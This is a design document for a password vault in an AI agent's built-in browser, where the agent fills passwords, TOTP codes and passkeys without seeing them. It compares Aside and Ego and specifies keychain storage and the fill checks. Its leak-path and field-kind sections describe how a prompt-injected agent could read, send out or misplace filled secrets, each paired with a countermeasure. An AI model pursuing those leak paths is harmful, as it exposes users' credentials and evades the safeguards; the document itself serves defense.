# Agent vault design for the built-in browser

Name: the name the person sees is "Passwords", and inside sentences it is "password manager". "Vault" in the body below
is the name used during design. The `Vault…` types in code, the storage location, the keychain service and the tool
names stay as they are.

Status: implemented. Decisions are in section 11, implementation steps and results in section 12. What changed during
implementation is collected in section 13. The built-in authenticator is section 14, and strong password suggestions
section 15.

Related documents: agent tools in [AGENT_BROWSER_TOOLS](AGENT_BROWSER_TOOLS.md), the browser host and passkeys in
[BROWSER_HOST](BROWSER_HOST.md) section 3, "Passkeys (WebAuthn)" and section 7, and the precedent for keeping secrets in
the keychain in [CONNECTORS](CONNECTORS.md) (`KeychainConnectorCredentialStore`).

## 0. Background and goals

The request (2026-10-23):

- For managing secrets and acting in the browser, a feature like Aside built into the browser would help.
- Passwords, passkeys and the like are a bottleneck: in many cases work stops while the user is away.
- It is a Yardlet-only feature, but removing it would not affect Codex or Claude, since it is closer to a separate
  product.
- (Through the parent task) It was not yet clear how much of Aside's feature set could be taken in.

The goal: even while the user is away, on sites the user allowed in advance, the agent gets past sign-in (password,
two-step verification code, passkey) and carries on with the work. The agent never sees secrets. The model names only
the item, and Yardlet puts the value into the browser's input field directly.

This is a Yardlet-only feature. Being Yardlet-only, it turns on and off in Yardlet's settings and writes nothing to
harness settings files, conversation history or accounts. Like the other browser tools, the tool comes in only through
`yardlet-mcp`, per session.

### 0.1 Long-term direction: a personal agent that handles the browser well

Direction (2026-10-24): not just bringing in Aside, but, over a longer term, a personal agent that handles the browser
well. Aside is a point of comparison, not the goal (section 2 is a reference map).

- Judgment and tool use, that is, the agent itself, belong to the harness (the harness belongs to the provider). Yardlet
  provides the base that lets that agent work for long stretches in the person's browser on the person's behalf: the
  browser, identity (sign-in) and being away. This is a layer the providers' apps will not build on the local Mac.
- Remove, one by one, the places where work stops while the person is away.

| Layer | Where work stops | What exists now | Next candidates |
|---|---|---|---|
| Browser control | Reading pages, clicking, several tabs | `browser_*` tools, 9 tabs per task, background tabs, preview cards | — |
| Sign-in | Passwords, two-step verification, passkeys, session expiry | Kept cookies, Touch ID passkeys (need the person) | **Vault (this document)** |
| Steps only the person can do | CAPTCHA, identity checks, payment approval | Passkey dialog notification, the agent asking the person in its reply | Hand off and wait: notification → the person sees and handles that tab, from the phone too → the task carries on |
| Identity | Personal and work accounts mixed in one profile, no Google sign-in | One profile shared by all tasks, Google through connectors | Splitting profiles |
| Continuing | Overnight, at a set time | Scheduled tasks, continuing after a restart, tabs that stay until the task is archived | — |
| Trusting it with work | Not knowing what it did | Conversation history, completion notifications, preview cards | Vault usage log and notifications |

The order starts with sign-in (the vault), the bottleneck the user named, then "hand off and wait", then identity. Each
layer turns on and off separately.

**Decided (D0, 2026-10-24):** this direction, vault first. The substance of the "personal agent" is harness tasks (for
example a pinned chat task plus scheduled tasks), and Yardlet builds that agent's hands (the browser), its keys (the
vault) and the way to call the person while they are away. Yardlet does not build its own memory, planning or
conversation loop.

## 1. Design overview

**Correction (2026-10-24):** build it as literally described, since a design made too conservative and safe everywhere
would please nobody. So the friction the person sees was lowered to the level of Aside and ordinary password managers,
and only the safeguards the person does not see were kept (the path that keeps values away from the model, site binding,
field kinds). What changed: new items default to "Always", matching by registrable domain, no Touch ID for turning the
vault on, raising an item's step or making a passkey, filling also into documents where the agent ran a script, no
notification on each fill, auto-lock only on screen lock, a save prompt when the person signs in and a key button in the
address bar, and the vault on by default.

- **What to store:** site passwords, TOTP secrets, and passkeys Yardlet holds (used without the person). No API keys
  (section 4.1).
- **Where:** the macOS login keychain. Items open only to Yardlet's signature (the Developer ID team) and do not sync
  through iCloud. No 1Password or Bitwarden connection this time (section 4.2).
- **One tool:** `browser_fill_credential` (item name, input field reference, kind). The result has no values and says
  only which fields were filled on which site (section 5.1).
- **Leak paths:** `browser_evaluate` is refused on a document once a value is filled into it, until a navigation or a
  reload opens another document. Screenshots mask filled fields, and every text result has used values scrubbed, as
  written and in their common encodings (section 5.3).
- **Person confirmation step:** per item, "Always (including while away)", "While unlocked" or "Every time (Touch ID)".
  New items default to "Always" (section 6).
- **Binding to sites:** the registrable domain (for `github.com`, also `www.github.com` and `gist.github.com`) must
  match in both the document with the field and the top-level document (section 6.2).
- **UI:** the "Vault" section in settings, the item sheet, a save prompt when the person signs in, a key button in the
  address bar on sites with items, and "Add to Vault…" and "Make a Vault Passkey" in the page's right-click menu. No new
  shortcuts or explanatory text (section 8).
- **Turning off and removing:** turning it off drops the tool from the list and refuses calls. "Empty Vault" deletes
  keychain items, the usage log and virtual authenticators too (section 9).

## 2. Aside feature map and verdicts for Yardlet

### 2.1 Sources

The primary sources (the maker's own writing) were read on 2026-10-23. Content found only in secondary sources is marked
"Secondary" in the tables.

| Tag | Source |
|---|---|
| [Home] | [aside.com](https://aside.com/) home page |
| [YC] | [Y Combinator company page](https://www.ycombinator.com/companies/aside) (F25, co-founders Jun Kim, Chanhee Lee and Sanghun Lee) |
| [Vault] | Help page [Use Password Manager](https://docs.aside.com/help/password-manager) |
| [Autofill] | Help page [Configure password autofill](https://docs.aside.com/help/passwords) |
| [Permissions] | Help page [Set agent permissions](https://docs.aside.com/help/security) |
| [Tasks] | Help page [Run tasks](https://docs.aside.com/help/tasks) |
| [Routines] | Help page [Use routines](https://docs.aside.com/help/automation) |
| [Developers] | Help page [Use the CLI, MCP, and REPL](https://docs.aside.com/help/developers) |
| [Memory] | Help page [Manage memory](https://docs.aside.com/help/memory) |
| [Models] | Help page [Configure AI providers](https://docs.aside.com/help/ai) |
| [Browser] | Help pages [Use Aside as your browser](https://docs.aside.com/help/browser-basics), [Get started](https://docs.aside.com/help/get-started) |
| [Troubleshooting] | Help page [Troubleshoot Aside](https://docs.aside.com/help/troubleshooting) |
| [Changes C] | [Components changelog](https://docs.aside.com/changelog/components) (shows 2026-06-22 to 10-23) |
| [Changes B] | [Aside Browser changelog](https://docs.aside.com/changelog/native) |
| [PH] | [Product Hunt](https://www.producthunt.com/products/aside-6) maker comments (words of the maker's people, but not documentation) |
| [Secondary] | [eesel.ai overview](https://www.eesel.ai/blog/aside-ai-browser) and others |

**The help pages and the changelog disagree.** The help pages ([Vault], [Troubleshooting]) say the person must step in
when "MFA, passkey approval, CAPTCHA, or identity verification" comes up. The newer changelog ([Changes C] 2026-10-21)
says "The agent can enroll the authenticator and fill codes without seeing the secret." So even in Aside, TOTP filling
by the agent arrived this month, and the official sources do not say whether the agent uses passkeys without the person.
If this design covers TOTP and Yardlet passkeys, it goes one step further than Aside there.

### 2.2 Verdicts

Criteria: **Possible as is** means Yardlet's current structure can serve the same use (where it already exists, that is
noted), **Partly possible** means only part of the use works or it takes a large separate effort, and **Hard** means it
is better not to do it because of technical limits or product principles.

**Agents and tasks**

| Aside feature | Source | Yardlet | Reason |
|---|---|---|---|
| A browser agent that works inside signed-in sites, model choice, connecting a Claude or ChatGPT subscription or an API key | [Home] [Tasks] [Models] [PH] | Possible as is (already there) | In Yardlet the harness (Claude Code, Codex and others) does the same work with the built-in browser tools `browser_*`. Each harness handles subscription sign-in. Yardlet does not build its own agent loop (the harness belongs to the provider) |
| Task permission modes (Read only, Guard and Full access), sandbox, Allow, Ask and Deny rules | [Permissions] [Tasks] | Possible as is (already there) | Uses the harness's permission modes and sandbox as they are (Claude permission modes, Codex approval policy and sandbox) |
| Sensitive actions such as payments, posts and messages wait for the person to confirm | [Home] [YC] | Partly possible | The harness's tool approval stays as it is. But a layer where Yardlet judges what a page action means (whether it is a payment) and blocks it would step into the agent's judgment, so there is none. Section 6 of this design decides the confirmation for vault filling itself |
| Routines: a new task on a schedule (cron), waking the same conversation again (heartbeat), finding repeated work and suggesting a routine draft | [Routines] [Home] | Partly possible | Scheduled tasks and `continueTaskId` correspond to cron and heartbeat. There is no routine suggestion, and automatic suggestion is a separate decision |
| Memory: reuses context learned from browsing history and conversations | [Memory] [Home] | Hard | Conflicts with the principle of not adding automatic context every turn. The harness's own memory stays as it is |
| Side panel: attaches the current page as context for a new task | [Tasks] | Partly possible | The Yardlet browser is a panel beside the task from the start, so that task's agent reads it directly. There is no flow for attaching a page to another new task |
| Ultrabrowse (a reasoning mode for research with many sources) | [Changes C] help page | Not applicable | The model and reasoning effort belong to the harness |
| Remote control through Slack, Telegram (and Discord) | [Changes C] 2026-08-04 [PH] | Partly possible | There is the phone remote connection ([REMOTE_PROTOCOL](REMOTE_PROTOCOL.md)). A messenger bot would mean running a bot on an outside service separately |
| Providing the browser to other coding agents through MCP and a CLI, installing skills into Codex, Claude Code, Cursor and OpenCode with `aside skills install` | [Developers] [Changes C] 2026-09-02 | Possible as is (already there) | `yardlet-mcp` is added per session. Writing skill files into harness folders would remain after Yardlet is removed, so Yardlet does not do it |
| REPL (running browser automation code) | [Developers] | Hard | It was decided not to have a resident Codex-style REPL (there is only `browser_evaluate`) |
| Keeping page titles and outside text from entering as system messages | [Changes C] 2026-10-10 | Possible as is (partly there already) | The tab list gives only the origin instead of the title, and messages between tasks are marked off with an envelope |
| Notification when a task ends | [Changes C] 2026-06-11 | Possible as is (already there) | Completion notification and Dock badge |

**Password manager (Aside Vault)**

| Aside feature | Source | Yardlet | Reason |
|---|---|---|---|
| The agent fills saved sign-ins without seeing the values ("login action", "saved password values stay hidden from AI") | [Home] [YC] [Vault] [Autofill] | Possible as is | Section 5 of this design. The host puts the value into the input field directly through CDP |
| Checking the target URL before filling, blocking agent autofill into other sites | [Autofill] [Changes C] 2026-06-06 | Possible as is | Section 6.2. The origin is taken from the value the browser reports |
| Agent access policy "Always allow / While unlocked / Never" (default Always allow), overridden per item | [Vault] [Autofill] | Possible as is | The three steps of section 6.1. As in Aside, the default for a new item is "Always" (user correction on 2026-10-24) |
| Unlocking the vault with Touch ID or Windows Hello | [Vault] | Possible as is | LocalAuthentication. A Mac without Touch ID uses the login password instead |
| Scoped access that gives each task only what it needs, a record each time a credential is used | [Home] (not in the help pages) | Possible as is | The usage log of section 6.3 and per-item site binding |
| TOTP: finding the QR on a setup page and offering to save it, the agent enrolling the authenticator and filling codes without seeing the secret | [Changes C] 2026-07-21 and 10-21 | Possible as is | Filling codes takes the same path as section 5. Since 2026-10-25 the panel reads a page's setup QR from the screen and offers to save it (section 14). There is no path yet for the agent to enroll a setup QR without the person |
| Saving passkeys, showing them automatically, conditional sign-in, syncing between devices, handing over to the browser's own passkey flow | [Changes C] 2026-07-21, 07-25 and 10-16 | Partly possible | Passkeys that Yardlet holds should be usable through a CDP virtual authenticator (checked in step 1 of section 12). No syncing between devices. Touch ID profile passkeys already work but need the person. Apple does not open up iCloud Keychain passkeys |
| Autofill for the person: sign-in suggestions, save prompts, password generation | [Autofill] | Partly possible | Because CEF renders off screen, Chrome's autocomplete list and save bubble do not appear in the panel. Yardlet draws them natively: a save prompt when the person signs in, a key button in the address bar on sites with items (section 8.3), a code bar when a verification code field shows (section 14), and a strong password bar at a new password field (section 15). There is no suggestion list attached under fields |
| Import: CSV, directly from other managers, Apple Passwords, the 1Password extension | [Autofill] [Troubleshooting] [Changes C] 2026-10-11 [Changes B] 06-20 | Partly possible | CSV is possible. Apple does not open up Apple Passwords or iCloud Keychain, and Yardlet has no extension path either |
| End-to-end encrypted sync through an Aside account, Secure Enclave, post-quantum cryptography | [Home] [Autofill] | Hard | Yardlet has no accounts or servers. The local keychain (encrypted with the login password, backed up by Time Machine) takes its place. A keychain that syncs through iCloud needs an entitlement and a provisioning profile on the app itself, so it is outside this scope |
| The agent cannot use the vault in incognito windows | [Vault] | Not applicable | Yardlet has no incognito windows |
| Hardware-based encryption and access audit logs | [Secondary] eesel.ai, [Home] | — | Confirmed only as a claim on the home page (not in the help pages) |

**Browser in general**

| Aside feature | Source | Yardlet | Reason |
|---|---|---|---|
| Importing history, cookies and bookmarks from other browsers (Chrome, Edge, Arc, Comet and Safari) | [Browser] [Changes B] 06-01 | Partly possible (cookies implemented 2026-10-26) | Cookies (sign-ins) are imported from Chromium-based browsers (Whale, Chrome, Edge, Brave, Arc, Vivaldi and Opera), only for sites the person picks: from the page menu of the browser panel, and the person clicks through the keychain permission dialog ([BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md) section 10). Safari was left out because it needs "Full Disk Access". History and bookmarks are not imported |
| Chrome extensions, the toolbar extension menu | [Changes B] 05-12 and 06-23 | Hard | With the CEF Alloy style and off-screen rendering there are no extension popups or toolbar |
| Google account sign-in | [Changes B] "Fixed Google OAuth2 sign-in getting logged out too often" | Hard | Google blocks sign-in from embedded browsers such as CEF. It works in Aside because Aside is a full browser built on a modified Chromium |
| Several profiles, copying between profiles | [Changes B] 07-13 and 10-22 | Partly possible | One host locks one profile (BROWSER_HOST section 10). For now all tasks share one profile |
| Split tabs, vertical tabs, selection shortcuts (summarize, translate), Lasso, Liquid Glass | [Browser] [PH] | Hard | Runs into the cap on what the UI exposes. Yardlet does not add browser UI that the two apps lack |

### 2.3 Order of adoption (recommended)

1. **Filling vault passwords**, with its policy and log (the password rows marked "Possible as is" in the table above).
   This is the first step of the bottleneck the user described.
2. **Filling TOTP codes.** Small, since it adds one more kind of secret on the same path.
3. **Yardlet passkeys (used without the person).** Done after the CDP virtual authenticator is verified in CEF.
4. **Saving from the site, and CSV import.** A save prompt when the person signs in, the key button in the address bar,
   right-click "Add to Vault…", CSV.

The rest already exists (agents, permissions, routines, MCP and notifications), is ruled out by principle (memory, REPL,
skill installation and browser UI), or is hard because of technical limits (Google sign-in, extensions, iCloud Keychain
and sync).

### 2.4 Ego feature map (2026-10-24)

At the parent task's request, Ego was researched in the same session as Aside. Two products are named "Ego". Both were
read from primary sources (the makers' sites, docs, changelogs and GitHub). No sign-up, installation or sign-in was
done.

| Tag | Source |
|---|---|
| [lite] | [ego(lite) home page](https://lite.ego.app/): Citro Labs' Chromium browser for agents, free |
| [lite docs] | [Quick start](https://lite.ego.app/document/en/docs/quick-start), [Space](https://lite.ego.app/document/en/docs/space), [ego-browser](https://lite.ego.app/document/en/docs/ego-browser), [What is ego(lite)](https://lite.ego.app/document/en/docs/product-introduce) |
| [lite changes] | [ego(lite) changelog](https://lite.ego.app/changelog) (0.4.4 to 0.6.0, 2026-07 to 10) |
| [lite GitHub] | [citrolabs/ego-lite](https://github.com/citrolabs/ego-lite): MIT; not the browser source but the `ego-browser` skill, package and docs |
| [ego] | [ego.app home page](https://www.ego.app/): "the personal agent that works 24/7 across every device", at the waitlist stage |

**ego(lite): a browser for agents**

| Feature | Source | Yardlet | Reason |
|---|---|---|---|
| A Space per task: its own tabs, does not take the person's tabs or focus, the person can step in to watch or take over | [lite] [lite docs] Space | Possible as is (tabs already there) | Yardlet already has 9 tabs and a panel per task |
| A Space is "One isolated BrowserContext per task, with its own cookies and storage", and the agent still inherits sign-ins already in the browser | [lite docs] Space, What is | Possible as is (this task) | [BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md) implements per-task storage isolation with CEF `CefRequestContext`. How ego carries sign-ins into each Space is not in its docs (they only say it differs from "copying the profile to a temporary folder") |
| Assigning a Profile to a task so that "each task uses its own login state and browsing data", choosing a Profile when making a Space | [lite changes] 0.4.4.15 and 0.4.6.12 | Possible as is (this task) | Same layer as above |
| A task's Space closes after 30 minutes without a command, a finished task's tabs stay for review, pinned Spaces survive a restart | [lite changes] 0.6.0.12 and 0.5.0.28 [lite docs] Space | Possible as is (already there) | A task's tabs stay until the task is archived, and hidden tabs are not drawn (BROWSER_HOST section 3) |
| Importing sign-ins, cookies, saved passwords, extensions and Profiles from Chrome, Edge, Brave and Safari (keychain permission dialog) | [lite docs] Quick start [lite changes] 0.6.0.12 and 0.5.1.11 | Partly possible | Passwords work through vault CSV import. Since 2026-10-26, cookies (sign-ins) are imported from Chromium-based browsers, only for sites the person picks (keychain permission dialog, [BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md) section 10). Safari was left out because it needs "Full Disk Access". Extensions are hard with CEF off-screen rendering |
| Writes the `ego-browser` skill to `~/.agents/skills` and `~/.claude/skills`, several actions in one Node script (`js()`, raw `cdp()`) | [lite docs] Quick start, ego-browser | Partly possible | Several actions already work through `browser_batch` (50 at a time). Writing skills into harness folders would remain after removal, and it was decided not to have a resident script runner |
| Snapshots that reach cross-origin iframes and shadow DOM, 200 to 400 tokens per page | [lite docs] What is | Possible as is (2026-10-26) | Reads iframes from other sites (including what is nested in them) and shadow DOM, and clicks and types through references. The size of a page also went down (HN front page 36,203 → 19,961 characters). The 200 to 400 tokens come from leaving out the body text, so Yardlet did not follow that |
| At a CAPTCHA, QR sign-in or payment confirmation the agent stops and the person steps into the Space to handle it | [lite docs] Space | Possible as is (2026-10-26) | `browser_handoff` opens the task's panel on that tab, calls the person with a bar and a notification, then waits for the person's "I'm done" or "Decline", or for text on the page |
| Sign-in with macOS iCloud Keychain passkeys and Touch ID | [lite changes] 0.5.1.12 | Hard | Touch ID profile passkeys work. iCloud Keychain passkeys need an Apple-approved entitlement and an NSWindow for the web content, and CEF's windowless tabs have no window (BROWSER_HOST section 3, "Passkeys (WebAuthn)"). It works in ego(lite) because that is a full Chromium with windows |
| Saving how a successful task was done as a per-site Skill ("coming soon"), `learnings/` | [lite docs] What is, ego-browser | Hard | It is a memory layer that changes the agent's judgment, so it is left to the harness |
| Tab groups, windows, Profiles, downloads, incognito and extensions | [lite docs] What is | Partly possible | Downloads and tabs exist. The rest runs into CEF limits and the UI cap (the product principle that the UI shows no more than the Codex and Claude apps do) |
| Tabs the agent opens are muted by default | [lite changes] 0.4.4.15 | Possible as is | A small convenience. Whether to add it is a separate decision |

**ego (ego.app): a personal agent**

| Feature | Source | Yardlet | Reason |
|---|---|---|---|
| The same agent everywhere: Dynamic Island, a desktop bar, a floating chat window, iMessage and an AI browser | [ego] | Partly possible | There is the phone remote connection ([REMOTE_PROTOCOL](REMOTE_PROTOCOL.md)) and a menu bar item. There is no iMessage bot and no Dynamic Island form |
| "Keeps working 24/7, even after you close your laptop", 10 or more tasks at once | [ego] | Partly possible | Yardlet runs scheduled tasks and continuations while the Mac is on. Running with the laptop closed needs a server, so it is hard |
| If the person is signed in in the browser, the agent uses that tool without OAuth or connector setup | [ego] | Possible as is | There are the built-in browser, the vault and connectors ([CONNECTORS](CONNECTORS.md)) |
| Mail, calendar, files and messengers through MCP | [ego] | Possible as is (already there) | Yardlet connectors |
| Four layers of memory (what was said, actions, reasoning and corrections), which the person can view, edit and delete | [ego] | Hard | By principle this belongs to the harness (the product principle that Yardlet does not become a layer that assumes it is there) |
| Voice input, approving the final confirmation with one tap in the Dynamic Island | [ego] | Partly possible | Notifications have "Allow once". There is no voice input |

### 2.5 Aside and Ego compared

- **Shared by both:** agents that work inside signed-in sites, providing the browser to coding agents through MCP and a
  CLI, installing skills into harness folders (both), several tasks at once, importing from other browsers, person
  confirmation before sensitive actions, and memory.
- **Only in Ego:** Spaces that split cookies and storage per task with a BrowserContext while inheriting sign-ins,
  assigning a Profile per task, closing unused Spaces automatically, snapshots that read into iframes and shadow DOM,
  several actions in one Node script, iCloud Keychain passkeys and Safari import. ego.app adds Dynamic Island, iMessage,
  tasks that keep running with the laptop closed, and voice input.
- **Only in Aside:** a password manager for agents (filling with hidden values, access policy, TOTP filling), remote
  control through Slack and Telegram, and routines. Aside's tasks share the default profile, and only "incognito" tasks
  run without profile state ([Tasks]).
- **What Yardlet takes (recommended order):** ① per-task storage isolation plus the vault to carry sign-ins (this task,
  a shape that combines the ego Space and Aside Vault), ② "hand off and wait", ③ iframes in snapshots, ④ importing
  cookies from other browsers (the person allows the keychain access, implemented 2026-10-26:
  [BROWSER_SESSION_ISOLATION](BROWSER_SESSION_ISOLATION.md) section 10). ② and ③ went in on 2026-10-26
  (`browser_handoff` and `browser_snapshot` in [AGENT_BROWSER_TOOLS](AGENT_BROWSER_TOOLS.md) section 2). Installing
  skills into harness folders, a memory layer and a resident script runner are ruled out by principle.

## 3. Non-goals

- No tool that shows secrets to the agent (reading a value, copying it to the clipboard).
- Nothing is written to harness settings files, conversation history or skill folders. A password manager MCP server or
  CLI that the user connected to a harness directly stays owned by the harness.
- No quiet reading of iCloud Keychain, Apple Passwords or Chrome passwords. Import works only from a CSV the person
  exported.
- No layer that classifies what a page action means (a payment, a post) and blocks it (the "Sensitive actions" row in
  section 2.2).
- Existing Touch ID profile passkeys are left alone. A Yardlet passkey is a separate passkey newly registered on the
  site.
- Payment details (cards) are out of scope; Codex `browserAuth` excludes them (section 10). Account creation is in
  scope only for its password: since 2026-10-28 Yardlet makes a strong password for a new account and saves it
  (section 15). Codex `browserAuth` leaves account creation out; the reason Yardlet does not is in section 15.3. Other
  sign-up fields are the agent's ordinary typing.

## 4. What to store and where

### 4.1 What to store

| Kind | Handled | Reason |
|---|---|---|
| Site usernames and passwords | Yes | The first step of the bottleneck. A username is not a secret but lives in the same item |
| TOTP secrets (RFC 6238, 30 seconds and 6 digits by default, SHA-1/256/512) | Yes | Yardlet generates each code when needed and fills it. Keeping passwords and TOTP in one vault has a cost: within that vault, two factors shrink to one (the same trade-off as 1Password, Bitwarden and Aside). Accepted, since the goal is use without the person |
| Passkeys used without the person (Yardlet keeps the private key) | Yes (second stage) | Registered and used through the CDP `WebAuthn` virtual authenticator (section 5.2). It is a software key, weaker than a device-bound Touch ID passkey, so the person registers it on the site as a separate passkey named "Yardlet" that can be deleted on the site on its own |
| API keys and tokens | No | Put into the agent's shell, they end up in the conversation history through `echo`, and there is no way to scrub them from tool output the harness records (provider history is not edited). A proxy that attaches them to outgoing requests (the Infisical Agent Vault approach) needs TLS interception and an installed certificate, which leave traces after removal. These are left to connector OAuth and the user's existing tools (`op run` and others) |
| Email and text message verification codes | No | Not a secret to store. The agent can read mail through the Gmail connector, and those codes live briefly. Push approval (Microsoft, Okta and Google prompts) is also an approval on the phone, so the vault cannot replace it (section 14.6) |

### 4.2 Storage locations compared

| | macOS keychain (Yardlet items) | 1Password CLI (`op`) | Bitwarden CLI (`bw`) |
|---|---|---|---|
| Opening without the person | Works. Items open only to Yardlet's signature | The desktop app integration unlocks with Touch ID and asks again after a period of no use. Without the person it needs a service account token, and Yardlet ends up keeping that token in the keychain anyway | Yardlet would have to keep the session key from `bw unlock` or the master password |
| TOTP | Computed by Yardlet | `op item get --otp` | `bw get totp` |
| Passkey signing | Works by loading the private key into the virtual authenticator | No way to sign with a passkey through the CLI | None |
| Scope | Only the items the person added (a small delegation list) | A service account sees only the vaults chosen for it. Opening the whole personal vault gives an injected agent a wide range to misuse | The whole vault |
| Dependencies | None. Same approach as connector tokens | Installation, sign-in, version matching, launching a process | Same |
| Backup and sync | Time Machine (the login keychain file), no sync | 1Password sync | Bitwarden sync |

**Recommendation:** use only the keychain this time. A small vault that holds only the sites entrusted to the agent fits
the principle of "only what each task needs", and a 1Password service account amounts to the same thing as making one
"Agent" vault. The store sits behind an engine-side protocol (`VaultStoring`), so that if the user wants, a 1Password
service account can later be attached as a second store under the same protocol. A public CLI existing is not a reason
to add UI now.

### 4.3 Keychain layout

- Secrets: a generic password item in the login keychain, service `<bundle ID>.vault`, account set to the item UUID,
  value in JSON (username, password, the last five passwords it replaced with when each was replaced, TOTP parameters,
  and for passkeys the credential ID, RP ID, user handle, PKCS#8 private key and signature count). The label is "Yardlet vault item" without the site name (so sites do not show in the
  Keychain Access list).
- Access: items Yardlet creates trust the designated requirement of the app that created them. The installed app is
  Developer ID signed and its requirement includes a team certificate condition (verified with `codesign -d -r-` on
  2026-10-24), so another program signed with the same identifier cannot read them without a permission dialog. An
  ad-hoc development build's requirement is only the identifier, which any program of the same user could imitate, so
  **the vault turns on only in team-signed builds** (off in ad-hoc and QA builds; QA uses a separate keychain in a
  temporary home).
- What is not secret (name, origin list, step, creation date, last use) goes in
  `~/Library/Application Support/Yardlet/Vault/items.json`. Drawing the settings list does not open the keychain.
- The usage log is `…/Vault/usage.jsonl` (no values, kept for 90 days).
- The data protection keychain (`kSecUseDataProtectionKeychain`) and keychain access control flags are not used, because
  they need a `keychain-access-groups` entitlement and a provisioning profile on the app itself. "Every time" is an
  app-side gate that confirms the person with LocalAuthentication before reading.

## 5. Paths that keep values away from the model

### 5.1 Tools

One tool is added: `browser_fill_credential`. Its description says only what it does (it does not say when to call it).

| Argument | Meaning |
|---|---|
| `ref` | The input field reference from the last snapshot. For a sign-in, Yardlet finds the username field and the password field of the form that field belongs to |
| `item` | Item name or username (optional; usernames since 2026-10-27). If empty, the item matching this tab's origin is used when there is exactly one; if there are several, an error with a list of "name (username)". Only the site's items that have what `kind` asks for (a password, a code, a passkey) are weighed, unless none has it, since a site's password and its two-factor code are often two items (section 14.3). Items with the same name, which import names after the site, are also picked by username |
| `kind` | `login` (default, username and password), `one_time_code` (TOTP), `passkey` (briefly prepares the virtual authenticator on this tab), `new_password` (a password Yardlet makes for a sign-up form, saved as a new item, section 15) |
| `submit` | Whether to submit the form after filling (optional): a safe form is submitted unless it is false (section 5.2) |
| `tabId` | Same as in the other page tools |

The result is one sentence without values. For example: "Filled the username and password of “GitHub (work)” into the
sign-in form on https://github.com and submitted it." It does not mention the value's length or first characters either.
A refusal returns `isError` with the reason (origin mismatch, step, document rule, field kind). There is no separate
tool that lists items. With no matching item, it answers "No vault item for https://…".

### 5.2 How filling works

1. **Origin check:** the origin of the tab's top-level document and the origin of the frame holding the field are taken
   from values the browser gives (`frameId` from CDP `DOM.describeNode` → `securityOrigin` from `Page.getFrameTree`).
   The page cannot change these values, and no URL from the model is used.
2. **Step check:** the step from section 6.1, the vault's lock state, and Touch ID if needed. (Before 2026-10-24 there
   was also "do not fill a document where the agent ran `browser_evaluate`". It blocked the common flow of inspecting a
   page before signing in, so it was removed.)
3. **Field kind check:** a password goes only into `input[type=password]`. A username goes only into a text or email
   field of the same form (`autocomplete=username` first), and TOTP only into a text, number or tel field that has
   `autocomplete=one-time-code`, a maximum length of 10 or less, numeric input, or a name that means a verification code
   (section 14.3). A code split into one-character fields is spread over the consecutive fields. This blocks injection
   that tries to put the password into a public text field on the same site (a comment, a bio).
4. **Destination check:** before a password or a code goes in, the field's form must send its fields only to the
   item's own sites over https (the form's `action` and every submit button's `formaction`, by the rules of section
   6.2; a `javascript:` action sends nothing). A form that sends them anywhere else is not filled, and the refusal
   names where it sends them. See "Filled values and addresses" below.
5. **Filling:** in an isolated world only Yardlet uses (`Page.createIsolatedWorld`), Yardlet takes the node, sets the
   value with the native `value` setter, then dispatches `input` and `change` events (the way password manager
   extensions do it). The node object is bound to that document, so if the page changes in between, the fill fails
   instead of landing somewhere else. For sites that ignore the events, the real-form check in step 1 of section 12
   decides on an `Input.insertText` (trusted input) fallback.
6. **Record:** the filled node (backend node ID) is written into the tab state, and a usage log entry and notification
   (section 6.3) are made.
7. **Submit:** a safe form, one whose every way of sending (its action and each submit button's) goes to the page's
   own origin over https (or to the local development server the page is on), and by POST when it holds a password, is
   submitted right after the fill unless `submit` is false, so the values stay on the page as briefly as they can, as
   1Password's agent autofill fills and submits. Submitting is a click on the form's submit button in the same isolated
   world (`requestSubmit()` when it has none). A form that would send a password by GET (which is also what a form
   without `method="post"` does) or a secret to another origin is filled and left unsent whatever `submit` says, and the
   result says why: the agent clicks the page's own button, whose script usually sends it another way. A one-time code
   may go by GET, since it is spent once sent. A field in no form gets Enter only with `submit: true`.

**Passkeys (`kind: passkey`):** Yardlet attaches a CDP virtual authenticator to this tab (`WebAuthn.enable`,
`WebAuthn.addVirtualAuthenticator`: ctap2, transport `internal`, with resident key and user verification, automatic
presence simulation), and adds that one credential (`WebAuthn.addCredential`) only when the item's RP ID matches the
tab's origin under WebAuthn rules. It signs the next request within 60 seconds, once (`WebAuthn.credentialAsserted`),
then removes the authenticator right away (`removeVirtualAuthenticator`, `disable`) and updates the signature count in
the keychain. While it is attached, that tab's Touch ID and phone passkeys cannot be used, so it is attached only
briefly. **Registration** happens while the person is present: after right-click "Make a Vault Passkey" (an empty
virtual authenticator on this tab for 2 minutes), when the person clicks the site's "Add a passkey", the credential
received through `WebAuthn.credentialAdded` (with the private key from `getCredentials`) goes into the keychain and the
authenticator is removed. The virtual authenticator's attestation is "none", so enterprise sites that require an
attestation certificate do not accept it. The backup eligible (BE) flag is off.

Agent tools do not expose raw CDP, so the private key from `WebAuthn.getCredentials` has no path into a tool result.
`browser_evaluate` is page JS and cannot call CDP.

### 5.3 How values could leak and how each way is blocked

| Path | How it is blocked |
|---|---|
| Tool arguments (text the model writes) | The model does not know the value. The arguments are only the item name and a reference |
| Tool results | No value or length is written (section 5.1) |
| Reading the field value with `browser_evaluate`, or `fetch` to the outside | Refused on the document the value was filled into, whether or not the field still holds it, and in the task's tabs linked to that tab by `window.opener` (one opened the other, directly or through other tabs) while it shows the document. It lifts when the tab goes to another document (a main frame navigation or a reload); an SPA that keeps its document after signing in needs a reload first, which the refusal says. The same holds whoever filled: the agent's tool, or the person's key button and code bar, which are recorded with the tab before the values go in. A page where the person typed into a password field in the panel, and a page the vault saw showing a two-factor setup (its QR code or `otpauth://` link), count as filled too. When the agent ran its own scripts (`browser_evaluate`) on the document before the fill, or in a tab linked to it while it was shown, the fill asks the person first whatever the item's policy, and fills nothing without them; the refusal tells the agent to reload and fill without scripts. The ordinary flow, a fill without scripts first, does not ask (user decision on 2026-10-28; on 2026-10-24 such fills were let through) |
